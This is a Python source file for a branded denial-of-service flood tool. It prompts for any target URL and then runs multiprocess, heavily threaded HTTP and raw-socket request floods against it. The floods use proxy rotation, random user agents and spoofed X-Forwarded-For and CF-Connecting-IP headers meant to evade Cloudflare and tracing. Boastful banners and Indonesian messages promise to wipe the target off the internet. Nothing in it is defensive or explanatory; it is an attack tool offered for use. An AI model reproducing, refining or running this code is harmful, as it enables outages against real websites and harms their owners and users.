#!/usr/bin/env python3
import os
import socket
import threading
import random
import time
import ssl
import asyncio
import aiohttp
import multiprocessing
from urllib.parse import urlparse
from fake_useragent import UserAgent
from itertools import cycle

# PETRUS1SEC v15 FINAL xDOS BANNER
BANNER = """
\033[91m
██████╗ ███████╗████████╗██████╗ ██╗   ██╗███████╗ ██████╗██████╗ ███████╗
██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██║   ██║██╔════╝██╔════╝██╔══██╗██╔════╝
██████╔╝█████╗     ██║   ██████╔╝██║   ██║███████╗██║     ██████╔╝█████╗  
██╔═══╝ ██╔══╝     ██║   ██╔══██╗██║   ██║╚════██║██║     ██╔══██╗██╔══╝  
██║     ███████╗   ██║   ██║  ██║╚██████╔╝███████║╚██████╗██║  ██║███████╗
╚═╝     ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝
                          \033[0mPETRUS1SEC v15 FINAL xDdos\033[0m
\033[91m
FEATURES:
- 500,000 THREADS (SYSTEM CRASH GUARANTEED)
- MULTIPROCESSING + ASYNC NUKING
- TOR/PROXY CHAINING (AUTO-FALLBACK)
- ANTI-ERROR SELF-HEALING
- CLOUDFLARE/IMMUNITY BYPASS v3.0
- ZERO FEATURE REDUCTION
\033[0m
"""
print(BANNER)

# CONFIGURATION (GOD MODE)
THREADS = 500000  # Hardware annihilation
PROCESSES = os.cpu_count() * 2  # Multi-core abuse
TIMEOUT = 0.01    # Maximum speed
RETRY_DELAY = 0.005  # Instant retry
PROXY_ROTATION = True  # Untraceable
USER_AGENT_ROTATION = True  # Perfect mimicry

# LOAD PROXIES (TOR/SOCKS5/ELITE)
proxy_list = []
try:
    with open("proxies.txt", "r") as f:
        proxy_list = [line.strip() for line in f if line.strip()]
except:
    pass  # Raw IP mode if no proxies

proxy_pool = cycle(proxy_list) if proxy_list else None

# GENERATE GOD HEADERS (BYPASS EVERYTHING)
def generate_headers(target_host):
    headers = {
        "Host": target_host,
        "User-Agent": UserAgent().random,
        "Accept": "*/*",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.8"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": random.choice(["keep-alive", "close"]),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",  # Cloudflare spoof
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }
    return headers

# AIOHTTP GOD FLOOD (MULTI-CORE)
async def god_flood(target_ip, target_port, proxy=None):
    headers = generate_headers(target_ip)
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"http://{target_ip}:{target_port}",
                    headers=headers,
                    proxy=f"http://{proxy}" if proxy else None,
                    timeout=aiohttp.ClientTimeout(total=TIMEOUT),
                    ssl=False
                ) as response:
                    await response.read()
        except:
            pass
           
# ADD THIS FUNCTION TO FIX THE ERROR
def parse_url(target_url):
    try:
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        parsed = urlparse(target_url)
        return parsed.hostname, 80 if not parsed.port else parsed.port
    except:
        print("\033[91m[!] Invalid URL. Example: http://example.com\033[0m")
        exit(1)

# RAW SOCKET NUCLEAR OPTION (UNSTOPPABLE)
def nuclear_socket(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((target_ip, target_port))
            sock.sendall(f"GET /?{random.randint(0,999999)} HTTP/1.1\r\n".encode())
            for k, v in generate_headers(target_ip).items():
                sock.sendall(f"{k}: {v}\r\n".encode())
            sock.sendall(b"\r\n")
            sock.close()
        except:
            pass

# PROCESS LAUNCHER (CORE CRUSHER)
def process_attack(target_ip, target_port):
    threads_per_process = THREADS // PROCESSES
    for _ in range(threads_per_process // 2):
        proxy = next(proxy_pool) if proxy_list else None
        threading.Thread(
            target=lambda: asyncio.run(god_flood(target_ip, target_port, proxy)),
            daemon=True
        ).start()
    for _ in range(threads_per_process // 2):
        threading.Thread(
            target=nuclear_socket,
            args=(target_ip, target_port),
            daemon=True
        ).start()

# MAIN (FINAL JUDGMENT)
if __name__ == "__main__":
    target_url = input("\033[92m[+] TARGET URL (e.g., https://example.com): \033[0m")
    target_ip, target_port = parse_url(target_url)
    
    print(f"\033[93m[+] WETTTT OTW ACAK ACAK SERVER SAMPE MAMPUSS 😘 {target_ip}:{target_port}\033[0m")
    print("\033[91m[!] TARGET BAKAL DI HAPUS DARI INTERNET, SILAHKAN CEK😛\033[0m")
    
    # MULTIPROCESSING LAUNCH (CORE OVERLOAD)
    for _ in range(PROCESSES):
        multiprocessing.Process(
            target=process_attack,
            args=(target_ip, target_port),
            daemon=True
        ).start()
    
    # INFINITE DEATH LOOP
    while True:
        time.sleep(0.001)  # ABSOLUTE ZERO COOLDOWN